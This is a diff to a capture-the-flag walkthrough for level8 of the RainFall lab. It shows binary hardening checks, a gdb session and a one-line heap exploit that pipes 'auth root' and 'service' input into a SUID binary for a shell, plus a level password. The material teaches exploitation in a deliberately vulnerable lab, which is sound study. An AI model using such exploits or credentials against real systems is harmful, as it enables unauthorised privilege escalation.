@@ -1,8 +1,17 @@
 Login as `level8`.
 ```shell
-┌──$ [~/42/2021/rainfall]
+┌──$ [~/42/2022/rainfall]
 └─>  ssh 192.168.0.28 -p 4242 -l level8
 level7@192.168.0.19's password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+  GCC stack protector support:            Enabled
+  Strict user copy checks:                Disabled
+  Restrict /dev/mem access:               Enabled
+  Restrict /dev/kmem access:              Enabled
+  grsecurity / PaX: No GRKERNSEC
+  Kernel Heap Hardening: No KERNHEAP
+ System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level8/level8
 ```
 A `SUID` executable is located in the home directory.
 ```shell
@@ -24,7 +33,7 @@ login
 Program received signal SIGSEGV, Segmentation fault.
 0x080486e7 in main ()
 ```
-Examine what happens nat failed instruction. It moves value offsetted `0x8049aac+0x20` into `eax` register.
+Examine what happened at failed instruction. It moves value has offset `0x8049aac+0x20` into `eax` register.
 ```gdb
 (gdb) disassemble $eip
 [...]
@@ -171,8 +180,10 @@ Continuing.
 $ id
 uid=2008(level8) gid=2008(level8) groups=2008(level8),100(users)
 ```
-
 As GDB drops SUID, run same input outside GDB.
+
+
+Exploit and log on to the next level.
 ```shell
 level8@RainFall:~$ (echo -e "auth root\n"; echo "service AAAAAAAAAAAAAAAAAAAA\n"; echo -n "login"; cat -) | ./level8
 (nil), (nil)
